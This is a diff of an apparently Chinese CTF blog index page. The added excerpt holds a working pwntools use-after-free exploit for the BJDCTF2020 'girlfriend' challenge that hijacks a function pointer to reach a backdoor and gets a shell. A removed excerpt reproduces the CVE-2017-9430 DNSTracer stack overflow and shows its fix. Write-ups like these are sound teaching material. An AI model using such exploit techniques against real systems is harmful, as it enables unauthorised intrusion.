@@ -131,6 +131,34 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/06/12/BJDCTF2020-girlfriend-wp/" >BJDCTF2020 girlfriend-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-06-12
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/12/BJDCTF2020-girlfriend-wp">相关资源</a></p>
+<h2 id="use-after-free"><a href="#use-after-free" class="headerlink" title="use after free"></a>use after free</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pty = process.PTY</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./girlfriend&quot;</span>, stdin=pty, stdout=pty)</span><br><span class="line"><span class="comment"># proc = remote(&quot;node2.anna.nssctf.cn&quot;, 28783)</span></span><br><span class="line">belf = ELF(<span class="string">&quot;./girlfriend&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/ctf/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size is :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name is :&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlt</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shw</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b add_girlfriend</span></span><br><span class="line"><span class="string">    b del_girlfriend</span></span><br><span class="line"><span class="string">    hook-bins</span></span><br><span class="line"><span class="string">    memory watch 0x00000000006020A0 6 qword</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(proc, gdbscript=gscript)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0000000000400B9C</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))    <span class="comment">#add时先分配 struc_ptr 再分配 name_ptr</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(backdoor))</span><br><span class="line">dlt(<span class="number">0</span>)      <span class="comment"># delete的时候先free  name_ptr 再free struc_ptr</span></span><br><span class="line">dlt(<span class="number">1</span>)      <span class="comment"># 所以name_ptr 先进入fastbin</span></span><br><span class="line"><span class="comment"># 两次delete结束后fastbin: </span></span><br><span class="line"><span class="comment"># [0x20] chunk3(struc_ptr) -&gt; chunk1(struc_ptr) -&gt; chunk2(name_ptr)</span></span><br><span class="line"><span class="comment"># [0x30] chunk4(name_ptr)</span></span><br><span class="line"><span class="comment"># 再次add, chunk1 会被当做 name_ptr</span></span><br><span class="line"><span class="comment"># 这样就可以复写它的 func_ptr, 再执行show，就执行了后门函数</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))</span><br><span class="line">shw(<span class="number">0</span>)</span><br><span class="line">pi()</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2023/06/12/BJDCTF2020-girlfriend-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/06/08/NISACTF2022-string-wp/" >NISACTF2022-string-wp</a>
 								</h3>
 							</div>
@@ -735,51 +763,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/05/13/CVE-2017-9430复现/" >CVE-2017-9430复现</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-05-13
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="CVE-2017-9430"><a href="#CVE-2017-9430" class="headerlink" title="CVE-2017-9430"></a>CVE-2017-9430</h1><ul>
-<li><h3 id="影响程序：DNSTracer-lt-1-9"><a href="#影响程序：DNSTracer-lt-1-9" class="headerlink" title="影响程序：DNSTracer   &lt;  1.9"></a>影响程序：DNSTracer   &lt;  1.9</h3></li>
-<li><h3 id="漏洞类型：栈缓冲区溢出"><a href="#漏洞类型：栈缓冲区溢出" class="headerlink" title="漏洞类型：栈缓冲区溢出"></a>漏洞类型：栈缓冲区溢出</h3></li>
-<li><h3 id="产生原因：strcpy-前未作长度检查"><a href="#产生原因：strcpy-前未作长度检查" class="headerlink" title="产生原因：strcpy 前未作长度检查"></a>产生原因：strcpy 前未作长度检查</h3></li>
-</ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先编译安装 DNSTracer：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget http://www.mavetju.org/download/dnstracer-1.9.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar zxvf dnstracer-1.9.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> dnstracer-1.9</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./confugure</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure>
-
-<p>传入一段超长的字符串作为参数即可触发栈溢出：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dnstracer -v $(python -c <span class="string">&#x27;print &quot;A&quot;*1025&#x27;</span>)</span></span><br><span class="line">*** buffer overflow detected ***: dnstracer terminated</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb757f377]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x68)[0xb760f6b8]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0xf58a8)[0xb760d8a8]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0xf4e9f)[0xb760ce9f]</span><br><span class="line">dnstracer[0x8048f26]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7530637]</span><br><span class="line">dnstracer[0x804920a]</span><br><span class="line">======= Memory map: ========</span><br><span class="line">08048000-0804e000 r-xp 00000000 08:01 270483     /usr/local/bin/dnstracer</span><br><span class="line">0804f000-08050000 r--p 00006000 08:01 270483     /usr/local/bin/dnstracer</span><br><span class="line">08050000-08051000 rw-p 00007000 08:01 270483     /usr/local/bin/dnstracer</span><br><span class="line">08051000-08053000 rw-p 00000000 00:00 0</span><br><span class="line">084b6000-084d7000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b74e4000-b7500000 r-xp 00000000 08:01 394789     /lib/i386-linux-gnu/libgcc_s.so.1</span><br><span class="line">b7500000-b7501000 rw-p 0001b000 08:01 394789     /lib/i386-linux-gnu/libgcc_s.so.1</span><br><span class="line">b7518000-b76c8000 r-xp 00000000 08:01 394751     /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">b76c8000-b76ca000 r--p 001af000 08:01 394751     /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">b76ca000-b76cb000 rw-p 001b1000 08:01 394751     /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">b76cb000-b76ce000 rw-p 00000000 00:00 0</span><br><span class="line">b76e4000-b76e7000 rw-p 00000000 00:00 0</span><br><span class="line">b76e7000-b76e9000 r--p 00000000 00:00 0          [vvar]</span><br><span class="line">b76e9000-b76eb000 r-xp 00000000 00:00 0          [vdso]</span><br><span class="line">b76eb000-b770d000 r-xp 00000000 08:01 394723     /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">b770d000-b770e000 rw-p 00000000 00:00 0</span><br><span class="line">b770e000-b770f000 r--p 00022000 08:01 394723     /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">b770f000-b7710000 rw-p 00023000 08:01 394723     /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">bf8e5000-bf907000 rw-p 00000000 00:00 0          [stack]</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞原因：把参数 <code>argv[0]</code> 复制到数组 <code>argv0</code> 的时候没有做长度检查，如果大于 1024 字节，就会导致栈溢出：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dnstracer_broker.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NS_MAXDNAME</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NS_MAXDNAME	1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dnstracer.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="type">char</span>	argv0[NS_MAXDNAME];</span><br><span class="line">    [...]</span><br><span class="line">    <span class="built_in">strcpy</span>(argv0, argv[<span class="number">0</span>]);</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>要修这个漏洞的话，在调用 <code>strcpy()</code> 前加上对参数长度的检查就可以了：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*CVE-2017-9430 Fix*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) &gt;= NS_MAXDNAME)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>(server_ip);</span><br><span class="line">    <span class="built_in">free</span>(server_name);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dnstracer: argument is too long %s\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check for a trailing dot</span></span><br><span class="line"><span class="built_in">strcpy</span>(argv0, argv[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
-
-	
-	</div>
-  <a type="button" href="/2023/05/13/CVE-2017-9430复现/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -827,7 +810,7 @@
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/CVE/">CVE<span>4</span></a></li>
+			<li><a href="/categories/CVE/">CVE<span>5</span></a></li>
 		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
@@ -852,48 +835,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
 		
-			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
-		
-			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
-		
-			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
-		
-			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
-		
-			<li><a href="/tags/php/">php<span>23</span></a></li>
-		
-			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
-		
-			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
-		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
-		
-			<li><a href="/tags/php原生类/">php原生类<span>1</span></a></li>
-		
-			<li><a href="/tags/伪协议/">伪协议<span>3</span></a></li>
-		
-			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
-		
-			<li><a href="/tags/index/">index<span>1</span></a></li>
-		
-			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
+			<li><a href="/tags/dcquals2019/">dcquals2019<span>1</span></a></li>
 		
 			<li><a href="/tags/canary/">canary<span>3</span></a></li>
 		
-			<li><a href="/tags/got/">got<span>3</span></a></li>
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>13</span></a></li>
 		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
 		
-			<li><a href="/tags/nssctf/">nssctf<span>54</span></a></li>
+			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
 		
-			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>87</span></a></li>
+		
+			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+		
+			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
+		
+			<li><a href="/tags/XXE/">XXE<span>1</span></a></li>
+		
+			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
+		
+			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
+		
+			<li><a href="/tags/index/">index<span>1</span></a></li>
+		
+			<li><a href="/tags/partial-overwrite/">partial overwrite<span>1</span></a></li>
+		
+			<li><a href="/tags/PUT/">PUT<span>1</span></a></li>
+		
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
+		
+			<li><a href="/tags/XCTFQuals2016/">XCTFQuals2016<span>1</span></a></li>
+		
+			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>111</span></a></li>
+		   <li><a href="/tags">...<span>113</span></a></li>
 		 
 		</ul>
 	</div>
@@ -904,6 +887,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/11/20/CVE-2018-1259复现/" ><i class="fa fa-file-o"></i>CVE-2018-1259复现</a>
+      </li>
     
       <li>
         <a href="/2023/11/10/swampctf2019-syscaller-wp/" ><i class="fa fa-file-o"></i>swampctf2019-syscaller-wp</a>
@@ -919,10 +906,6 @@
     
       <li>
         <a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" ><i class="fa fa-file-o"></i>GDOUCTF2023-反方向的钟-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/20/ssti/" ><i class="fa fa-file-o"></i>SSTI模板注入</a>
       </li>
     
   </ul>
